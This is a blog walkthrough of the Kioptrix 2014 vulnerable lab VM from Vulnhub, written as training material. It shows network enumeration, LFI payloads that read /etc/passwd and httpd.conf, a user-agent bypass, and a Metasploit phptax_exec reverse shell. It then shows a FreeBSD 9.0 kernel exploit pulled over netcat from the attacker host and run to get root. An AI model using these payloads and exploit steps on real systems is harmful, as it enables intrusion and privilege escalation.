---
layout: post
title: "Kioptrix 2014 (#5) Walkthrough"
date: 2017-01-07 12:00:00
share: true
comments: true
tags: [Vulnhub Walkthrough, Kioptrix series]
---

Kioptrix 2014 VM can be downloaded[here](https://www.vulnhub.com/entry/kioptrix-2014-5,62/). 

## 0\. Get VMs IP

```console
    root@kali:~# netdiscover -r 192.168.1.0/24  
      
     Currently scanning: Finished!   |   Screen View: Unique Hosts                   
                                                                                     
     258 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 15480             
     _____________________________________________________________________________  
       IP            At MAC Address     Count     Len  MAC Vendor / Hostname        
     -----------------------------------------------------------------------------  
     ...  
     192.168.1.68    c4:e9:84:10:d3:5e      2     120  TP-LINK TECHNOLOGIES CO.,LTD  
     ...    
```

## 1\. Enumeration

### TCP Ports enumeration

```console
root@kali:~# nmap -p- -sV 192.168.1.68  
  
Starting Nmap 7.40 ( https://nmap.org ) at 2017-01-07 15:00 EST  
Service scan Timing: About 0.00% done  
Nmap scan report for 192.168.1.68  
Host is up (0.00016s latency).  
Not shown: 65532 filtered ports  
PORT     STATE  SERVICE VERSION  
22/tcp   closed ssh  
**80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)  
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)**  
MAC Address: C4:E9:84:10:D3:5E (Tp-link Technologies)  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 112.67 seconds  
```    
We found some decent information:  

  * Web server on port 80
  * Web server on port 8080 (Proxy?)
  * Victim's OS is FreeBSD

---

## 2\. Web server port 80

```
It works!
```
 
Uhh, well I'm glad it does. Checking the source code was worth it.  

```html    
<head>  
  <!--  
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">  
  -->  
 </head>  
  
 <body>  
  <h1>It works!</h1>  
 </body>
```
  
Hitting `/pChart2.1.3/index.php` shows some charting tool. After searching for the tool's name on searchsploit, it showed that it's vulnerable to LFI.  

Example:  

```
http://192.168.1.68/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd  
```    

  
After poking around for a while I wasn't able to find anything useful, what's the next step? For that, let's see what we currently know.  
  
1\. Victim runs FreeBSD, so many important files could be under different paths.  
2\. Port 8080 returns a 403, what's preventing us from accessing the page?  
  
Since we have an LFI and we know that the server is running Apache, let's search for the apache config file. After checking this, I managed to find the `httpd.config` file.  

```
http://192.168.1.68/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf  
```    

  
Particularly interesting snippet:  

```apache
SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser  
  
<VirtualHost *:8080>  
    DocumentRoot /usr/local/www/apache22/data2  
  
 <Directory "/usr/local/www/apache22/data2">  
  Options Indexes FollowSymLinks  
  AllowOverride All  
  Order allow,deny  
  Allow from env=Mozilla4_browser  
 </Directory>  
  
</VirtualHost>  
```

  
We'll need to access the server running on 8080 with a different user-agent.  
 
```console
root@kali:~/Desktop# curl -H "User-Agent:Mozilla/4.0" http://192.168.1.68:8080


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">  
<html>  
 <head>  
  <title>Index of /</title>  
 </head>  
 <body>  
<h1>Index of /</h1>  
<ul><li><a href="phptax/"> phptax/</a></li>  
</ul>  
</body></html> 


root@kali:~/Desktop# curl -H "User-Agent:Mozilla/4.0" http://192.168.1.68:8080/phptax/
    _lots of markup_ 
```
  
So what should we do next?  

---

## 3\. Getting a shell, and root

```
msf > **use exploit/multi/http/phptax_exec**  
  
msf exploit(phptax_exec) > **show options**  
  
Module options (exploit/multi/http/phptax_exec):  
  
   Name       Current Setting  Required  Description  
   ----       ---------------  --------  -----------  
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]  
   RHOST                       yes       The target address  
   RPORT      80               yes       The target port  
   SSL        false            no        Negotiate SSL/TLS for outgoing connections  
   TARGETURI  /phptax/         yes       The path to the web application  
   VHOST                       no        HTTP server virtual host  
  
  
Exploit target:  
  
   Id  Name  
   --  ----  
   0   PhpTax 0.8  
  
  
  
msf exploit(phptax_exec) > **set RHOST 192.168.1.68**  
RHOST => 192.168.1.68  
  
msf exploit(phptax_exec) > **set RPORT 8080**  
RPORT => 8080  
  
msf exploit(phptax_exec) > **run**  
  
[*] Started reverse TCP double handler on 192.168.1.67:4444   
[*] 192.168.1.688080 - Sending request...  
[*] Accepted the first client connection...  
[*] Accepted the second client connection...  
[*] Accepted the first client connection...  
[*] Accepted the second client connection...  
[*] Command: echo V5HLbXsCcLqrTr6R;  
[*] Writing to socket A  
[*] Writing to socket B  
[*] Reading from sockets...  
[*] Command: echo dcW9zf08z50hnZcW;  
[*] Writing to socket A  
[*] Writing to socket B  
[*] Reading from sockets...  
[*] Reading from socket B  
[*] B: "V5HLbXsCcLqrTr6R\r\n"  
[*] Matching...  
[*] A is input...  
[*] Reading from socket B  
[*] B: "dcW9zf08z50hnZcW\r\n"  
[*] Matching...  
[*] A is input...  
[*] Command shell session 1 opened (192.168.1.67:4444 -> 192.168.1.68:20092) at 2017-01-07 16:39:33 -0500  
[*] Command shell session 2 opened (192.168.1.67:4444 -> 192.168.1.68:40864) at 2017-01-07 16:39:33 -0500  
  
whoami  
www  
```

I won't go through all my attempts since they were many, I'm listing the important ones findings though:  

  * It's running FreeBSD 9.0 
  * No users in /home
  * System doesn't have python, bash, wget and many other stuff, it does have perl and gcc though

Easily enough, searching for an exploit for FreeBSD 9.0 was [straight-forward](https://www.exploit-db.com/exploits/28718/). I transferred the exploit file through nc, compiled it and got root.  

```console
which gcc  
/usr/bin/gcc  
cd /tmp  
wget https://www.exploit-db.com/download/28718  
wget: not found  
which nc  
/usr/bin/nc  
nc -nv 192.168.1.67 443 -w 5 > exploit.c  
Connection to 192.168.1.67 443 port [tcp/*] succeeded!  
  
gcc exploit.c  
  
./a.out  
[+] SYSRET FUCKUP!!  
[+] Start Engine...  
[+] Crotz...  
[+] Crotz...  
[+] Crotz...  
[+] Woohoo!!!  
whoami  
root  
```

Where's our flag?

```console
cd /root  
ls -al  
total 88  
drwxr-xr-x   2 root  wheel   512 Jan  7 00:57 .  
drwxr-xr-x  18 root  wheel  1024 Jan  7 01:42 ..  
-rw-r--r--   2 root  wheel   793 Jan  3  2012 .cshrc  
-rw-------   1 root  wheel     0 Apr  6  2014 .history  
-rw-r--r--   1 root  wheel   151 Jan  3  2012 .k5login  
-rw-r--r--   1 root  wheel   299 Jan  3  2012 .login  
-rw-------   1 root  wheel     1 Mar 30  2014 .mysql_history  
-rw-r--r--   2 root  wheel   256 Jan  3  2012 .profile  
----------   1 root  wheel  2611 Apr  3  2014 congrats.txt  
-rw-r--r--   1 root  wheel   885 Jan  7 16:49 folderMonitor.log  
lrwxr-xr-x   1 root  wheel    25 Mar 29  2014 httpd-access.log -> /var/log/httpd-access.log  
-rwxr-xr-x   1 root  wheel   574 Apr  3  2014 lazyClearLog.sh  
-rwx------   1 root  wheel  2366 Mar 28  2014 monitor.py  
lrwxr-xr-x   1 root  wheel    44 Mar 29  2014 ossec-alerts.log -> /usr/local/ossec-hids/logs/alerts/alerts.log  
chmod 777 congrats.txt  
cat congrats.txt   
If you are reading this, it means you got root (or cheated).  
Congratulations either way...  
  
Hope you enjoyed this new VM of mine. As always, they are made for the beginner in   
mind, and not meant for the seasoned pentester. However this does not mean one   
can't enjoy them.  
  
As with all my VMs, besides getting "root" on the system, the goal is to also  
learn the basics skills needed to compromise a system. Most importantly, in my mind,  
are information gathering & research. Anyone can throw massive amounts of exploits  
and "hope" it works, but think about the traffic.. the logs... Best to take it  
slow, and read up on the information you gathered and hopefully craft better  
more targetted attacks.   
  
For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.  
Knowing the OS gives you any idea of what will work and what won't from the get go.  
Default file locations are not the same on FreeBSD versus a Linux based distribution.  
Apache logs aren't in "/var/log/apache/access.log", but in "/var/log/httpd-access.log".  
It's default document root is not "/var/www/" but in "/usr/local/www/apache22/data".  
Finding and knowing these little details will greatly help during an attack. Of course  
my examples are specific for this target, but the theory applies to all systems.  
  
As a small exercise, look at the logs and see how much noise you generated. Of course  
the log results may not be accurate if you created a snapshot and reverted, but at least  
it will give you an idea. For fun, I installed "OSSEC-HIDS" and monitored a few things.  
Default settings, nothing fancy but it should've logged a few of your attacks. Look  
at the following files:  
/root/folderMonitor.log  
/root/httpd-access.log (softlink)  
/root/ossec-alerts.log (softlink)  
  
The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified  
files in 2 specific folders. Since FreeBSD doesn't support "iNotify", I couldn't use OSSEC-HIDS   
for this.  
The httpd-access.log is rather self-explanatory .  
Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain  
files. This one should've detected a few of your web attacks.  
  
Feel free to explore the system and other log files to see how noisy, or silent, you were.  
And again, thank you for taking the time to download and play.  
Sincerely hope you enjoyed yourself.  
  
Be good...  
  
  
loneferret  
http://www.kioptrix.com  
  
  
p.s.: Keep in mind, for each "web attack" detected by OSSEC-HIDS, by  
default it would've blocked your IP (both in hosts.allow & Firewall) for  
600 seconds. I was nice enough to remove that part :)  
```

---

#### _Final notes_

VM is quite entertaining, yet I had a lot of trouble knowing what I should be looking for after I got the LFI vulnerability. I had limited knowledge about FreeBSD so I thought the apache file didn't exist first time I attempted it.  
  
Make sure you read the flag file carefully, I won't discuss it since it's pretty much self-explanatory.
